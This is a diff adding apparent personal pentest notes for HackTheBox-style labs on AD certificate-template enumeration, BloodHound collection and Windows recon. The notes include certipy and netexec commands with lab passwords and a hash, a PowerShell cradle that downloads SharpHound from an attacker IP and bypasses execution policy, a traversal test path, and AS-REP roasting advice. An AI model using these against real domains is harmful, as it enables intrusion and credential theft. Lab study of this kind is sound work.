@@ -1,0 +1,81 @@
+# AD Certificate Services & BloodHound
+
+## AD Mindmap
+https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
+
+## ADCS Enumeration
+
+Basic enumeration via netexec:
+```bash
+nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs
+```
+
+Certipy — enumerate vulnerable templates:
+```bash
+certipy find -u j.fleischman@fluffy.htb -p J0elTHEM4n1990! -dc-ip 10.129.16.130 -vulnerable -stdout
+certipy find -target dc01.tombwatcher.htb -u cert_admin -p 'vinh' -vulnerable -stdout
+```
+
+Certipy with NTLM hash instead of password:
+```bash
+certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
+```
+
+Get full list of ADCS templates:
+```bash
+certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -stdout
+```
+
+## BloodHound
+
+### Collection — on victim machine
+```bash
+.\SharpHound.exe
+```
+
+SharpHound via PowerShell download cradle:
+```bash
+iwr http://10.10.14.103:4444/SharpHound.ps1 -OutFile SharpHound.ps1
+Invoke-BloodHound -CollectionMethods All -OutputDirectory C:\Users\svc-alfresco\AppData\Local\Temp -Verbosity 2
+```
+
+Full download + bypass + run sequence:
+```bash
+iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
+powershell -ep bypass
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+```
+
+### Collection — from attacker machine
+```bash
+bloodhound-ce-python -c all -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.10.11.69 --zip
+bloodhound-ce-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb -ns 10.129.4.178 -dc dc.voleur.htb -c all --zip --dns-tcp
+```
+
+### BloodHound CE — get initial Docker password
+```bash
+docker-compose logs bloodhound | grep -i "Initial Password" | tail -1
+docker-compose logs bloodhound | grep -i "Initial Password"
+```
+
+## Misc
+
+Directory traversal test file:
+```
+/windows/system32/drivers/etc/hosts
+```
+
+## Enumeration Strategy (Windows, many open ports)
+
+**Must look at:**
+- SMB — look for open shares
+- LDAP — can I get info without credentials?
+
+**If those fail:**
+- Kerberos — brute force usernames, then AS-REP-roast any found
+- DNS — zone transfer possible? Brute force subdomains?
+- RPC — anonymous access possible?
+
+**Note for creds:**
+- WinRM — creds for a user in Remote Management Users group = shell
